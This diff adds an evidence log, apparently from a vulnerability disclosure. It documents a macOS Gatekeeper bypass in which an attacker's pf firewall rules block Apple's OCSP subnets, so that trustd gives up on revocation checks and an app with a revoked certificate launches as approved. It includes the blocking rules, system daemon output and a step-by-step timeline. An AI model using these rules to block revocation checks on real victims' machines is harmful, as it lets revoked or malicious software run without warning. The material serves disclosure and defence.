@@ -1,0 +1,123 @@
+================================================================================
+CURATED EVIDENCE LOG — Campaign 6.0 Cache Clear Bypass
+Date: July 28, 2026, 20:24–20:33 EDT
+Host: macOS Tahoe 26.4.1 (Build 25E253), MacBook Pro M1
+Attack: pf subnet block on Thunderbolt bridge (bridge0)
+================================================================================
+
+This file contains key log lines extracted from Campaign 6.0, demonstrating
+that the OCSP cache (which repopulated on July 22, 2026 when DNS poisoning was
+not active) is trivially defeated by clearing the cache and blocking network
+access to Apple's OCSP servers. No Apple-side fix was deployed — the OCSP
+responder was already serving revocation (proven by the July 9 positive control).
+
+All lines are unmodified system daemon output captured via `log stream`.
+No PII is present — logs contain only system process identifiers.
+
+================================================================================
+SECTION 1: ATTACKER-SIDE — pf RULES (Mac B, bridge0 interface)
+================================================================================
+
+block drop quick on bridge0 inet proto tcp from any to 17.253.0.0/16 port = 80
+block drop quick on bridge0 inet proto tcp from any to 17.248.228.0/24 port = 80
+block drop quick on bridge0 inet proto tcp from any to 17.171.0.0/16 port = 80
+block drop quick on bridge0 inet proto tcp from any to 17.253.0.0/16 port = 443
+block drop quick on bridge0 inet proto tcp from any to 17.248.228.0/24 port = 443
+block drop quick on bridge0 inet proto tcp from any to 17.171.0.0/16 port = 443
+
+================================================================================
+SECTION 2: VICTIM-SIDE — trustd OCSP FAILURES (Mac A)
+================================================================================
+
+--- 2a. valid.apple.com update fails (CRLite/valid.sqlite3 unreachable) ---
+
+2026-07-28 20:25:07.285 Df trustd[406:4d3f] [com.apple.securityd:validupdate] Session task failed with error Error Domain=NSURLErrorDomain Code=-1001 "The request timed out." UserInfo={NSErrorFailingURLStringKey=https://valid.apple.com/g7/v0}
+
+--- 2b. OCSP download failures (ocsp.apple.com unreachable) ---
+
+2026-07-28 20:25:03.695 Df trustd[623:4f96] [com.apple.securityd:rvc] Failed to download ocsp response [...] with error Error Domain=NSURLErrorDomain Code=-1001 "(trustd) The request timed out" UserInfo={NSErrorFailingURLStringKey=http://ocsp.apple.com/ocsp03-apsecca1g1}
+
+2026-07-28 20:25:03.696 Df trustd[623:4f96] [com.apple.securityd:rvc] Failed to download ocsp response [...] with error Error Domain=NSURLErrorDomain Code=-1001 "(trustd) The request timed out" UserInfo={NSErrorFailingURLStringKey=http://ocsp.apple.com/ocsp03-applerootcag3}
+
+--- 2c. trustd gives up on OCSP — skips all further checks ---
+
+2026-07-28 20:30:58.471 Df trustd[406:6ec9] [com.apple.securityd:http] skipping host due to too many recent timeouts: ocsp.apple.com
+2026-07-28 20:30:58.474 Df trustd[406:6ec9] [com.apple.securityd:http] skipping host due to too many recent timeouts: ocsp.apple.com
+2026-07-28 20:30:58.486 Df trustd[406:6ec9] [com.apple.securityd:http] skipping host due to too many recent timeouts: ocsp.apple.com
+2026-07-28 20:30:58.488 Df trustd[406:6ec9] [com.apple.securityd:http] skipping host due to too many recent timeouts: ocsp.apple.com
+2026-07-28 20:30:58.489 Df trustd[406:6ec9] [com.apple.securityd:http] skipping host due to too many recent timeouts: ocsp.apple.com
+2026-07-28 20:30:58.491 Df trustd[406:6ec9] [com.apple.securityd:http] skipping host due to too many recent timeouts: ocsp.apple.com
+2026-07-28 20:30:58.492 Df trustd[406:6ec9] [com.apple.securityd:http] skipping host due to too many recent timeouts: ocsp.apple.com
+2026-07-28 20:30:58.494 Df trustd[406:6ec9] [com.apple.securityd:http] skipping host due to too many recent timeouts: ocsp.apple.com
+2026-07-28 20:30:58.497 Df trustd[406:6ec9] [com.apple.securityd:http] skipping host due to too many recent timeouts: ocsp.apple.com
+
+--- 2d. OCSP responder returns no status for revoked cert ---
+
+2026-07-28 20:30:59.152 Df trustd[623:6dd4] [com.apple.securityd:ocsp] ocsp responder: (null) did not include status of requested cert
+
+================================================================================
+SECTION 3: VICTIM-SIDE — syspolicyd GATEKEEPER BYPASS (Mac A)
+================================================================================
+
+--- 3a. Notarization daemon unreachable ---
+
+2026-07-28 20:25:31.900 Df syspolicyd[455:5347] [com.apple.securityd:SecError] Error checking with notarization daemon: 3
+2026-07-28 20:25:31.901 Df syspolicyd[455:5347] [com.apple.securityd:SecError] Error checking with notarization daemon: 3
+
+--- 3b. Network timeouts (CloudKit policy fetch fails) ---
+
+2026-07-28 20:28:09.845 E  syspolicyd[455:62b8] [com.apple.CFNetwork:Default] Task finished with error [-1001] Error Domain=NSURLErrorDomain Code=-1001 "Operation timed out"
+2026-07-28 20:28:09.849 E  syspolicyd[455:62b8] [com.apple.syspolicy:default] cloudkit request failed: Error Domain=NSURLErrorDomain Code=-1001
+2026-07-28 20:28:09.849 E  syspolicyd[455:6149] [com.apple.syspolicy:default] Unable to fetch policy data: Error Domain=NSURLErrorDomain Code=-1001
+
+--- 3c. Rule 16 FAIL-OPEN — Gatekeeper allows execution ---
+
+2026-07-28 20:27:29.991 Df syspolicyd[455:613f] [com.apple.securityd:gk] rule 16 applies - allow=1
+2026-07-28 20:29:40.379 Df syspolicyd[455:6422] [com.apple.securityd:gk] rule 16 applies - allow=1
+2026-07-28 20:30:53.501 Df syspolicyd[455:6ec2] [com.apple.securityd:gk] rule 16 applies - allow=1
+
+--- 3d. ChatGPT.app (revoked cert, team 2DC432GLL2 = OpenAI) launches successfully ---
+
+2026-07-28 20:30:58.417 Df syspolicyd[455:6eeb] [com.apple.syspolicy.exec:default] GK performScan: PST: (path: 67470768ebf1c304), (team: 2DC432GLL2), (id: (null)), (bundle_id: (null))
+2026-07-28 20:30:59.341 Df syspolicyd[455:6ec2] [com.apple.syspolicy.exec:default] GK evaluateScanResult: 0, PST: (path: 67470768ebf1c304), (team: 2DC432GLL2), (id: com.openai.chat), (bundle_id: com.openai.chat), 1, 0, 1, 0, 4, 4, 1
+2026-07-28 20:31:01.331 Df syspolicyd[455:6ec2] [com.apple.syspolicy.exec:default] Marked application as user approved: 1, PST: (path: 67470768ebf1c304), (team: 2DC432GLL2), (id: com.openai.chat), (bundle_id: com.openai.chat)
+
+================================================================================
+SECTION 4: INTERPRETATION
+================================================================================
+
+Timeline of bypass:
+  20:24:49  — System boot (Recovery Mode reboot cleared OCSP cache)
+  20:25:03  — trustd attempts OCSP → times out (pf rules block Apple subnets)
+  20:25:07  — valid.apple.com update fails (CRLite DB cannot refresh)
+  20:27:29  — First rule 16 fail-open observed
+  20:30:53  — Rule 16 applied to ChatGPT.app evaluation
+  20:30:58  — trustd skips OCSP entirely ("too many recent timeouts")
+  20:30:59  — GK evaluateScanResult: 0 (PASS) for com.openai.chat
+  20:31:01  — Application marked as user-approved; launches successfully
+
+The revoked-certificate app (ChatGPT v1.2026.041, cert revoked May 8, 2026)
+launched with full Gatekeeper approval. No "Malware Blocked" dialog appeared.
+spctl returned "accepted, source=Notarized Developer ID" — Gatekeeper fully
+accepted the revoked-certificate app as if it were legitimate. The user saw
+only a standard "downloaded from the Internet" prompt with an Open button,
+the same dialog shown for any notarized app. No right-click bypass was needed.
+
+The OCSP cache (repopulated July 22 when DNS poisoning was not active) was defeated by:
+  1. Clearing the in-memory OCSP cache via Recovery Mode reboot
+  2. Blocking Apple OCSP/CDN subnets via pf firewall rules
+
+This demonstrates that the cache-based defense only protects scenarios
+where the victim has PREVIOUSLY and SUCCESSFULLY queried OCSP for that
+specific certificate. Fresh Macs, newly revoked certificates, and persistent
+attacker networks have ZERO protection.
+
+NOTE (Aug 5, 2026): Previous versions of this document referred to an
+"Apple OCSP responder fix deployed July 22." This was incorrect. The
+OCSP responder was already serving revocation for this cert (proven by
+the July 9 positive control). The cached response appeared on July 22
+simply because DNS poisoning was not active at that time.
+
+================================================================================
+END OF EVIDENCE EXCERPT
+================================================================================
